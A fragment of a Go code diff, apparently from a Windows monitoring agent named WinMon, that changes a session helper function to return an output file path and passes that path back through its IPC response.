+		}
+		return "", input.TriggerHotkey(args)
 	}
-
-	return fmt.Errorf("unsupported helper command: %s", cmd)
+	return "", fmt.Errorf("unsupported helper command: %s", cmd)
 }
 
 func parseDuration(arg string) time.Duration {
@@ -777,7 +880,7 @@ func imageExtFromMagic(data []byte) string {
 func RunSessionAgentLoop() error {
 	log.Println("Starting WinMon Persistent Session Agent (Session 1 IPC Listener)...")
 	return service.StartIPCAgentServer(func(req service.IPCRequest) service.IPCResponse {
-		err := RunSessionHelper(req.Cmd, req.FlatArgs, req.OutputFile)
+		outPath, err := RunSessionHelper(req.Cmd, req.FlatArgs, req.OutputFile)
 		if err != nil {
 			return service.IPCResponse{
 				Success: false,
@@ -786,7 +889,7 @@ func RunSessionAgentLoop() error {
 		}
 		return service.IPCResponse{
 			Success:    true,
-			OutputFile: req.OutputFile,
+			OutputFile: outPath,
 		}
 	})
 }
